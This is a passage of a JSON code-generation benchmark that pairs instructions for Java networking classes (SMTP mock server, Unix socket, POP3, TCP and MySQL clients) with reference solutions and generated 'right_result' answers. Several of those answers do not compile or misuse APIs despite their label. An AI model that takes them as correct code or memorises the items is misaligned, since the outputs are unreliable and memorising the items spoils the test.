    "right_result": "import java.net.*;\nimport java.io.*;\nimport java.util.concurrent.*;\nimport javax.net.ssl.*;\n\npublic class MockSmtpServer {\n    private Deque<SmtpInteraction> interactions;\n    private CountDownLatch waitForConnectionClosed;\n    private CountDownLatch waitForAllExpectedCommands;\n    private KeyStoreProvider keyStoreProvider;\n    private Logger logger;\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer() {\n        interactions = new ArrayDeque<>();\n        waitForConnectionClosed = new CountDownLatch(1);\n        waitForAllExpectedCommands = new CountDownLatch(1);\n        keyStoreProvider = new KeyStoreProviderImpl();\n        logger = new LoggerImpl();\n        host = \"localhost\";\n        port = 0;\n    }\n\n    public void start() {\n        try {\n            port = findAvailablePort();\n            ServerSocket serverSocket = new ServerSocket(port, 1, InetAddress.getByName(host));\n            mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands, logger, keyStoreProvider);\n            mockServerThread.start();\n        } catch (IOException e) {\n            logger.log(\"Error starting server: \" + e.getMessage());\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                mockServerThread.join();\n            } catch (InterruptedException e) {\n                logger.log(\"Error shutting down server: \" + e.getMessage());\n            }\n        }\n    }\n\n    private int findAvailablePort() {\n        for (int i = 1024; i <= 65535; i++) {\n            try {\n                ServerSocket ss = new ServerSocket(i, 1, InetAddress.getByName(host));\n                ss.close();\n                return i;\n            } catch (IOException e) {\n                // Port is not available\n            }\n        }\n        throw new RuntimeException(\"No available port found\");\n    }\n\n    private class MockServerThread implements Runnable {\n        private ServerSocket serverSocket;\n        private Deque<SmtpInteraction> interactions;\n        private CountDownLatch waitForConnectionClosed;\n        private CountDownLatch waitForAllExpectedCommands;\n        private Logger logger;\n        private KeyStoreProvider keyStoreProvider;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger, KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!shouldStop()) {\n                    Socket clientSocket = serverSocket.accept();\n                    processClient(clientSocket);\n                }\n            } catch (IOException e) {\n                logger.log(\"Error in server thread: \" + e.getMessage());\n            } catch (InterruptedException e) {\n                logger.log(\"Server thread interrupted: \" + e.getMessage());\n            }\n        }\n\n        private void processClient(Socket clientSocket) throws IOException {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n                boolean clientDisconnected = false;\n                while (!clientDisconnected && !shouldStop()) {\n                    SmtpInteraction interaction = interactions.pollFirst();\n                    if (interaction == null) {\n                        clientDisconnected = true;\n                        waitForConnectionClosed.await();\n                    } else {\n                        if (interaction instanceof ExpectedCommand) {\n                            String command = readLine(in);\n                            if (!command.equals(((ExpectedCommand) interaction).getCommand())) {\n                                logger.log(\"Expected command '\" + ((ExpectedCommand) interaction).getCommand() + \"' but got '\" + command + \"'\");\n                                clientDisconnected = true;\n                            }\n                        } else if (interaction instanceof CannedResponse) {\n                            writeCannedResponse(out, (CannedResponse) interaction);\n                        } else if (interaction instanceof UpgradeToTls) {\n                            upgradeToTls(clientSocket);\n                        }\n                    }\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing client socket: \" + e.getMessage());\n                }\n            }\n        }\n\n        private String readLine(BufferedReader in) throws IOException {\n            String line = in.readLine();\n            if (line == null) {\n                return null;\n            }\n            return line.trim();\n        }\n\n        private void writeCannedResponse(PrintWriter out, CannedResponse response) {\n            out.println(response.getResponse());\n            out.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws IOException {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            try {\n                sslContext.init(keyStoreProvider.getKeyManagers(), null, null);\n            } catch (NoSuchAlgorithmException | KeyManagementException e) {\n                logger.log(\"Error initializing SSL context: \" + e.getMessage());\n                return;\n            }\n\n            SSLSocketFactory factory = sslContext.getSocketFactory();\n            SSLSocket sslSocket = (SSLSocket) factory.createSocket(socket, null, 0, true);\n            sslSocket.startHandshake();\n            socket.close();\n        }\n\n        private void shouldStop() {\n            // Implementation to check if the server should stop\n        }\n    }\n}\n\ninterface SmtpInteraction {}\nclass ExpectedCommand implements SmtpInteraction {\n    private String command;\n\n    public ExpectedCommand(String command) {\n        this.command = command;\n    }\n\n    public String getCommand() {\n        return command;\n    }\n}\nclass CannedResponse implements SmtpInteraction {\n    private String response;\n\n    public CannedResponse(String response) {\n        this.response = response;\n    }\n\n    public String getResponse() {\n        return response;\n    }\n}\nclass UpgradeToTls implements SmtpInteraction {}\n\ninterface Logger {\n    void log(String message);\n}\n\ninterface KeyStoreProvider {\n    KeyManager[] getKeyManagers();\n}\n\nclass KeyStoreProviderImpl implements KeyStoreProvider {\n    @Override\n    public KeyManager[] getKeyManagers() {\n        return new KeyManager[0];\n    }\n}\n\nclass LoggerImpl implements Logger {\n    @Override\n    public void log(String message) {\n        System.out.println(message);\n    }\n}"
  },
  {
    "Task_id": 566,
    "Instruction": "Task Description: Create a Java class that implements Unix domain socket communication using SocketChannel for inter-process communication on Unix-like systems.\n\nClass Description: The UnixSocket class extends AbstractSocket and provides functionality for Unix domain socket communication. It uses Java's SocketChannel for establishing connections and supports input/output stream operations.\n\nAttributes:\n- socketAddress: [SocketAddress] - The address of the Unix domain socket\n- socketChannel: [SocketChannel] - The channel used for socket communication\n\nMethods:\n- UnixSocket(String path) -> [void] - Constructor that creates a Unix domain socket connection to the specified path. Throws various exceptions if the operation fails.\n- getInputStream() -> [InputStream] - Returns an input stream for reading data from the socket. Throws SocketException if the socket is closed, not connected, or input is shutdown.\n- getOutputStream() -> [OutputStream] - Returns an output stream for writing data to the socket. Throws SocketException if the socket is closed, not connected, or output is shutdown.\n- getLocalSocketAddress() -> [SocketAddress] - Returns the local socket address.\n- getRemoteSocketAddress() -> [SocketAddress] - Returns the remote socket address (same as local for Unix domain sockets).\n- close() -> [void] - Closes the socket channel and releases resources.\n- WrappedWritableByteChannel.write(ByteBuffer src) -> [int] - Inner class method that writes data from the buffer to the socket channel.\n- WrappedWritableByteChannel.isOpen() -> [boolean] - Inner class method that checks if the channel is open.\n- WrappedWritableByteChannel.close() -> [void] - Inner class method that closes the channel.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.Channels;\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.WritableByteChannel;\n\npublic class UnixSocket extends AbstractSocket {\n\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException,\n            IllegalAccessException, IOException {\n        Class<?> unixDomainSocketAddress = Class.forName(\"java.net.UnixDomainSocketAddress\");\n        this.socketAddress =\n                (SocketAddress) unixDomainSocketAddress.getMethod(\"of\", String.class)\n                        .invoke(null, path);\n        this.socketChannel = SocketChannel.open(this.socketAddress);\n    }\n\n    @Override\n    public InputStream getInputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isInputShutdown()) {\n            throw new SocketException(\"Socket input is shutdown\");\n        }\n        return Channels.newInputStream(socketChannel);\n    }\n\n    @Override\n    public OutputStream getOutputStream() throws IOException {\n        if (isClosed()) {\n            throw new SocketException(\"Socket is closed\");\n        }\n        if (!isConnected()) {\n            throw new SocketException(\"Socket is not connected\");\n        }\n        if (isOutputShutdown()) {\n            throw new SocketException(\"Socket output is shutdown\");\n        }\n        return Channels.newOutputStream(new WrappedWritableByteChannel());\n    }\n\n    @Override\n    public SocketAddress getLocalSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public SocketAddress getRemoteSocketAddress() {\n        return socketAddress;\n    }\n\n    @Override\n    public void close() throws IOException {\n        super.close();\n        this.socketChannel.close();\n    }\n\n    private class WrappedWritableByteChannel implements WritableByteChannel {\n        @Override\n        public int write(ByteBuffer src) throws IOException {\n            return UnixSocket.this.socketChannel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return UnixSocket.this.socketChannel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            UnixSocket.this.socketChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.channels.*;\nimport java.nio.*;\n\npublic class UnixSocket extends AbstractSocket {\n    private final SocketAddress socketAddress;\n    private final SocketChannel socketChannel;\n\n    public UnixSocket(String path) throws IOException {\n        this.socketAddress = new UnixDomainSocketAddress(path);\n        this.socketChannel = SocketChannel.open();\n        this.socketChannel.configureBlocking(true);\n        this.socketChannel.connect(this.socketAddress);\n    }\n\n    public InputStream getInputStream() throws SocketException {\n        if (!socketChannel.isConnected() || !socketChannel.isOpen()) {\n            throw new SocketException(\"Socket is not connected or closed\");\n        }\n        if (socketChannel.isInputShutdown()) {\n            throw new SocketException(\"Input is shutdown\");\n        }\n        return Channels.newInputStream(socketChannel);\n    }\n\n    public OutputStream getOutputStream() throws SocketException {\n        if (!socketChannel.isConnected() || !socketChannel.isOpen()) {\n            throw new SocketException(\"Socket is not connected or closed\");\n        }\n        if (socketChannel.isOutputShutdown()) {\n            throw new SocketException(\"Output is shutdown\");\n        }\n        return Channels.newOutputStream(socketChannel);\n    }\n\n    public SocketAddress getLocalSocketAddress() {\n        return socketChannel.getLocalAddress();\n    }\n\n    public SocketAddress getRemoteSocketAddress() {\n        return socketChannel.getRemoteAddress();\n    }\n\n    public void close() throws IOException {\n        if (socketChannel != null) {\n            socketChannel.close();\n        }\n    }\n\n    private class WrappedWritableByteChannel implements WritableByteChannel {\n        @Override\n        public int write(ByteBuffer src) {\n            return socketChannel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return socketChannel.isOpen();\n        }\n\n        @Override\n        public void close() {\n            socketChannel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 570,
    "Instruction": "Task Description: Implement a POP3 client connection class in Java that handles socket communication with a POP3 server, including connection establishment, data transmission, and resource cleanup.\n\nClass Description: The Pop3Connection class provides functionality to connect to a POP3 server using TCP sockets, send and receive data through input/output streams, and manage the connection lifecycle.\n\nAttributes:\n- socket: Socket - The TCP socket used for communication with the server\n- in: BufferedInputStream - Input stream for reading data from the server\n- out: BufferedOutputStream - Output stream for writing data to the server\n\nMethods:\n- connect() -> Socket - Establishes a connection to the POP3 server by trying all available IP addresses for the host\n- connectToAddress(InetAddress address) -> Socket - Creates and connects a socket to a specific server address\n- open() -> void - Opens the connection by initializing socket and streams, throws MessagingException on failure\n- isOpen() -> boolean - Checks if the connection is currently active and valid\n- close() -> void - Closes all connection resources (socket and streams)\n- writeLine(String s) -> void - Writes a line of text to the server (appends CRLF)\n- readLine() -> String - Reads a line of text from the server (handles CRLF line endings)",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\nclass Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    private Socket connect() throws IOException, UnknownHostException {\n        InetAddress[] inetAddresses = InetAddress.getAllByName(settings.getHost());\n        IOException connectException = null;\n        for (InetAddress address : inetAddresses) {\n            try {\n                return connectToAddress(address);\n            } catch (IOException e) {\n                connectException = e;\n            }\n        }\n        throw connectException != null ? connectException : new UnknownHostException();\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        InetSocketAddress socketAddress = new InetSocketAddress(address, settings.getPort());\n        final Socket socket = new Socket();\n        socket.connect(socketAddress, SOCKET_CONNECT_TIMEOUT);\n        return socket;\n    }\n\n    void open() throws MessagingException {\n        try {\n            socket = connect();\n            in = new BufferedInputStream(socket.getInputStream(), 1024);\n            out = new BufferedOutputStream(socket.getOutputStream(), 512);\n            socket.setSoTimeout(SOCKET_READ_TIMEOUT);\n            if (!isOpen()) {\n                throw new MessagingException(\"Unable to connect socket\");\n            }\n        } catch (IOException ioe) {\n            close();\n            throw new MessagingException(\"Unable to open connection to POP server.\", ioe);\n        }\n    }\n\n    boolean isOpen() {\n        return (in != null && out != null && socket != null\n                && socket.isConnected() && !socket.isClosed());\n    }\n\n    void close() {\n        try {\n            in.close();\n        } catch (Exception e) {}\n        try {\n            out.close();\n        } catch (Exception e) {}\n        try {\n            socket.close();\n        } catch (Exception e) {}\n        in = null;\n        out = null;\n        socket = null;\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write(s.getBytes());\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int d = in.read();\n        if (d == -1) {\n            throw new IOException(\"End of stream reached while trying to read line.\");\n        }\n        do {\n            if (((char)d) == '\\r') {\n                continue;\n            } else if (((char)d) == '\\n') {\n                break;\n            } else {\n                sb.append((char)d);\n            }\n        } while ((d = in.read()) != -1);\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    public Socket connect() {\n        try {\n            InetAddress[] addresses = InetAddress.getAllByName(\"pop3.example.com\");\n            for (InetAddress address : addresses) {\n                socket = new Socket(address, 110);\n                if (socket.isConnected()) {\n                    return socket;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        return new Socket(address, 110);\n    }\n\n    public void open() throws MessagingException {\n        try {\n            if (socket == null || !socket.isConnected()) {\n                socket = connect();\n                if (socket == null) {\n                    throw new MessagingException(\"Could not connect to server\");\n                }\n            }\n            in = new BufferedInputStream(socket.getInputStream());\n            out = new BufferedOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            throw new MessagingException(\"Error opening connection\", e);\n        }\n    }\n\n    public boolean isOpen() {\n        return socket != null && socket.isConnected() && !socket.isClosed();\n    }\n\n    public void close() {\n        try {\n            if (out != null) {\n                out.close();\n            }\n            if (in != null) {\n                in.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public void writeLine(String s) throws IOException {\n        if (s == null) {\n            return;\n        }\n        out.write(s.getBytes());\n        out.write(\"\\r\\n\".getBytes());\n        out.flush();\n    }\n\n    public String readLine() throws IOException {\n        StringBuilder line = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            char ch = (char) c;\n            if (ch == '\\r' || ch == '\\n') {\n                break;\n            }\n            line.append(ch);\n        }\n        return line.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 571,
    "Instruction": "Task Description: Create a TCP client class that establishes a connection to a server, sends requests, receives responses, and manages the connection lifecycle.\n\nClass Description: TcpRequester is a TCP client implementation that handles communication with a server using sockets. It provides methods to start/stop the connection, send requests, and fetch responses. The class manages socket resources and includes error handling for network operations.\n\nAttributes:\n- sock: Socket - The socket instance used for TCP communication  \n- in: InputStream - Input stream for reading server responses  \n- out: OutputStream - Output stream for sending requests to the server  \n- dest: SocketAddress - The server address to connect to  \n- request: String - The initial request string  \n- passcode: String - Authentication passcode  \n- on_rsp: Consumer<ByteArray> - Callback for handling responses  \n\nMethods:\n- start(InetAddress bind_addr, long timeout, int ttl) -> T - Establishes a socket connection to the server with specified timeout and TTL  \n- stop() -> T - Closes the socket and releases all resources  \n- isRunning() -> boolean - Checks if the connection is active  \n- sendRequest(byte[] request) -> T - Sends a byte array request to the server  \n- fetchResponse() -> ByteArray - Reads and returns the server response as a ByteArray",
    "Canonical_solution": "import org.jgroups.util.ByteArray;\nimport org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\n\nprotected class TcpRequester extends Requester {\n    protected Socket       sock;\n    protected InputStream  in;\n    protected OutputStream out;\n\n    protected TcpRequester(SocketAddress dest, String request, String passcode,\n                           Consumer<ByteArray> on_rsp) {\n        super(dest, request, passcode, on_rsp);\n    }\n\n    protected <T extends Requester> T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock=new Socket();\n        sock.setSoTimeout((int)timeout);\n        sock.bind(new InetSocketAddress(bind_addr, 0));\n        sock.connect(dest);\n        in=sock.getInputStream();\n        out=sock.getOutputStream();\n        return (T)this;\n    }\n\n    protected <T extends Requester> T stop() {\n        Util.close(sock,in,out);\n        return (T)this;\n    }\n\n    protected boolean isRunning() {\n        return sock != null && !sock.isClosed();\n    }\n\n    protected <T extends Requester> T sendRequest(byte[] request) throws IOException {\n        out.write(request);\n        out.write('\\n');\n        return (T)this;\n    }\n\n    protected ByteArray fetchResponse() {\n        byte[] buf=new byte[1024];\n        int    index=0;\n\n        for(;;) {\n            try {\n                int bytes_read=in.read(buf, index, buf.length - index);\n                if(bytes_read == -1) {\n                    if(index > 0)\n                        break;\n                    return null;\n                }\n                index+=bytes_read;\n                if(index >= buf.length) {\n                    byte[] tmp=new byte[buf.length + 1024];\n                    System.arraycopy(buf, 0, tmp, 0, index);\n                    buf=tmp;\n                }\n            }\n            catch(IOException e) {\n                break;\n            }\n        }\n        return new ByteArray(buf, 0, index);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.util.function.Consumer;\n\npublic class TcpRequester {\n    private Socket sock;\n    private InputStream in;\n    private OutputStream out;\n    private SocketAddress dest;\n    private String request;\n    private String passcode;\n    private Consumer<ByteArray> on_rsp;\n\n    public TcpRequester start(InetAddress bind_addr, long timeout, int ttl) {\n        try {\n            sock = new Socket();\n            if (bind_addr != null) {\n                sock.bind(new SocketAddress(bind_addr, 0));\n            }\n            sock.setSoTimeout((int) timeout);\n            sock.setOption(SocketOptions.SO_TTL, ttl);\n            sock.connect(dest);\n            in = new InputStreamReader(sock.getInputStream());\n            out = new OutputStreamWriter(sock.getOutputStream());\n            return this;\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start connection\", e);\n        }\n    }\n\n    public TcpRequester stop() {\n        try {\n            if (sock != null && sock.isConnected()) {\n                sock.close();\n                in.close();\n                out.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n        return this;\n    }\n\n    public boolean isRunning() {\n        return sock != null && sock.isConnected();\n    }\n\n    public TcpRequester sendRequest(byte[] request) {\n        try {\n            out.write(request);\n            out.flush();\n        } catch (IOException e) {\n            // Handle exception\n        }\n        return this;\n    }\n\n    public ByteArray fetchResponse() {\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n            ByteArray response = new ByteArray(baos.toByteArray());\n            on_rsp.accept(response);\n            return response;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to fetch response\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 577,
    "Instruction": "Task Description: Implement a MySQL client channel class in Java that handles TCP socket communication with a MySQL server, including connection management, query execution, and packet handling.\n\nClass Description: MySQLChannel is a final class that provides a TCP-based communication channel to interact with a MySQL server. It manages socket connections, executes SQL queries, and handles MySQL protocol packets. The class includes connection configuration, buffer management, and proper resource cleanup.\n\nAttributes:\n- dsc: [DataSourceConfig] - Configuration object containing host, port and other connection parameters\n- socket: [Socket] - TCP socket connection to the MySQL server\n- in: [InputStream] - Buffered input stream for reading server responses\n- out: [OutputStream] - Buffered output stream for sending commands to server\n- isClosed: [AtomicBoolean] - Thread-safe flag indicating whether the channel is closed\n\nMethods:\n- connect(long timeout) -> [void] - Establishes a TCP connection to the MySQL server with specified timeout and configures socket parameters\n- execute(String statement) -> [BinaryPacket] - Executes a SQL query statement and returns the server response as a binary packet\n- receive() -> [BinaryPacket] - Reads and returns a binary packet from the server\n- close() -> [void] - Closes the connection by sending a QUIT command and releasing resources\n- BinaryPacket: [static class] - Represents a MySQL binary packet with data and packet ID\n- CommandPacket: [static class] - Represents a MySQL command packet with packet ID, command type, and arguments\n- MySQLPacket: [static class] - Contains MySQL protocol constants\n- QuitPacket: [static class] - Contains the QUIT command packet data",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic final class MySQLChannel {\n\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private final AtomicBoolean isClosed;\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(long timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setTrafficClass(0x04 | 0x10);\n        socket.setPerformancePreferences(0, 2, 1);\n        socket.setReceiveBufferSize(16 * 1024);\n        socket.setSendBufferSize(8 * 1024);\n        socket.connect(new InetSocketAddress(dsc.getHost(), dsc.getPort()), 10 * 1000);\n\n        in = new BufferedInputStream(socket.getInputStream(), 16 * 1024);\n        out = new BufferedOutputStream(socket.getOutputStream(), 8 * 1024);\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        CommandPacket packet = new CommandPacket();\n        packet.packetId = 0;\n        packet.command = MySQLPacket.COM_QUERY;\n        packet.arg = statement.getBytes();\n\n        packet.write(out);\n        out.flush();\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n                // Log error if needed\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                    // Log error if needed\n                }\n            }\n        }\n    }\n\n    private static class BinaryPacket {\n        public byte[] data;\n        public int packetId;\n\n        public void read(InputStream in) throws IOException {\n            // Implementation of packet reading\n        }\n    }\n\n    private static class CommandPacket {\n        public int packetId;\n        public byte command;\n        public byte[] arg;\n\n        public void write(OutputStream out) throws IOException {\n            // Implementation of packet writing\n        }\n    }\n\n    private static class MySQLPacket {\n        public static final byte COM_QUERY = 0x03;\n    }\n\n    private static class QuitPacket {\n        public static final byte[] QUIT = new byte[]{0x01, 0x00, 0x00, 0x00, 0x01};\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.nio.charset.StandardCharsets;\n\npublic final class MySQLChannel {\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private AtomicBoolean isClosed;\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(long timeout) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(dsc.getHost(), dsc.getPort()), (int) timeout);\n        socket.setSoTimeout((int) timeout);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        CommandPacket cmd = new CommandPacket(MySQLPacket.COM_QUERY, statement);\n        sendPacket(cmd);\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead = in.read(buffer);\n        if (bytesRead <= 0) return null;\n\n        int length = buffer[0] & 0xFF;\n        if (length > bytesRead) return null;\n\n        byte[] data = new byte[length];\n        System.arraycopy(buffer, 1, data, 0, length);\n        return new BinaryPacket(data, 1);\n    }\n\n    public void close() {\n        if (!isClosed.get()) {\n            QuitPacket quit = new QuitPacket();\n            sendPacket(quit);\n            try {\n                if (socket != null) {\n                    socket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            isClosed.set(true);\n        }\n    }\n\n    private void sendPacket(Object packet) throws IOException {\n        if (packet instanceof CommandPacket cmd) {\n            byte[] commandTypeByte = new byte[1];\n            commandTypeByte[0] = (byte) cmd.commandType;\n            byte[] argumentBytes = cmd.argument.getBytes(StandardCharsets.UTF_8);\n            int length = 1 + argumentBytes.length;\n            byte[] lengthByte = new byte[1];\n            lengthByte[0] = (byte) length;\n            byte[] packetData = new byte[length + 1];\n            packetData[0] = lengthByte[0];\n            System.arraycopy(commandTypeByte, 0, packetData, 1, 1);\n            System.arraycopy(argumentBytes, 0, packetData, 2, argumentBytes.length);\n            out.write(packetData);\n            out.flush();\n        } else if (packet instanceof QuitPacket quit) {\n            byte[] lengthByte = new byte[1];\n            lengthByte[0] = (byte) 1;\n            byte[] packetData = new byte[2];\n            packetData[0] = lengthByte[0];\n            packetData[1] = (byte) MySQLPacket.COM_QUIT;\n            out.write(packetData);\n            out.flush();\n        }\n    }\n\n    public static class BinaryPacket {\n        private final byte[] data;\n        private final int packetId;\n\n        public BinaryPacket(byte[] data, int packetId) {\n            this.data = data;\n            this.packetId = packetId;\n        }\n\n        public byte[] getData() {\n            return data;\n        }\n\n        public int getPacketId() {\n            return packetId;\n        }\n    }\n\n    public static class CommandPacket {\n        private final int commandType;\n        private final String argument;\n\n        public CommandPacket(int commandType, String argument) {\n            this.commandType = commandType;\n            this.argument = argument;\n        }\n\n        public int getCommandType() {\n            return commandType;\n        }\n\n        public String getArgument() {\n            return argument;\n        }\n    }\n\n    public static class MySQLPacket {\n        public static final int COM_QUERY = 1;\n        public static final int COM_QUIT = 4;\n    }\n\n    public static class QuitPacket {}\n}\n```"
  },
  {
    "Task_id": 588,
    "Instruction": "Task Description: Create a Java class that establishes and manages a TCP client connection to a server using sockets, enabling bidirectional communication through input/output streams.\n\nClass Description: The GreysConsole class represents a TCP client that connects to a specified server address, maintains the connection, and provides mechanisms for sending and receiving data. It handles connection lifecycle and resource cleanup.\n\nAttributes:\n- socket: [Socket] - The underlying TCP socket connection to the server\n- socketWriter: [BufferedWriter] - Buffered writer for sending data to the server\n- socketReader: [BufferedReader] - Buffered reader for receiving data from the server\n- isRunning: [boolean] - Flag indicating whether the connection is active\n\nMethods:\n- connect: [InetSocketAddress] -> [Socket] - Establishes a connection to the server at the specified address, configures socket options, and initializes I/O streams\n- shutdown: [void] -> [void] - Closes all resources (socket and streams) and marks the connection as inactive\n- GreysConsole (constructor): [InetSocketAddress] -> [void] - Creates a new instance and establishes connection to the specified server address",
    "Canonical_solution": "import com.github.ompc.greys.core.command.Commands;\nimport jline.console.ConsoleReader;\nimport jline.console.completer.Completer;\nimport jline.console.history.FileHistory;\nimport jline.console.history.History;\nimport jline.console.history.MemoryHistory;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.List;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\n\nimport static com.github.ompc.greys.core.util.GaStringUtils.DEFAULT_PROMPT;\nimport static java.io.File.separatorChar;\nimport static java.lang.System.getProperty;\nimport static jline.console.KeyMap.CTRL_D;\nimport static jline.internal.Preconditions.checkNotNull;\nimport static org.apache.commons.io.IOUtils.closeQuietly;\nimport static org.apache.commons.lang3.StringUtils.EMPTY;\nimport static org.apache.commons.lang3.StringUtils.isNotBlank;\n\npublic class GreysConsole {\n\n    private final Socket socket;\n    private BufferedWriter socketWriter;\n    private BufferedReader socketReader;\n    private volatile boolean isRunning;\n\n    public GreysConsole(InetSocketAddress address) throws IOException {\n        this.socket = connect(address);\n        this.isRunning = true;\n    }\n\n    private Socket connect(InetSocketAddress address) throws IOException {\n        final Socket socket = new Socket();\n        socket.setSoTimeout(0);\n        socket.connect(address, 60 * 1000);\n        socket.setKeepAlive(true);\n        socketWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        return socket;\n    }\n\n    private void shutdown() {\n        isRunning = false;\n        closeQuietly(socketWriter);\n        closeQuietly(socketReader);\n        closeQuietly(socket);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
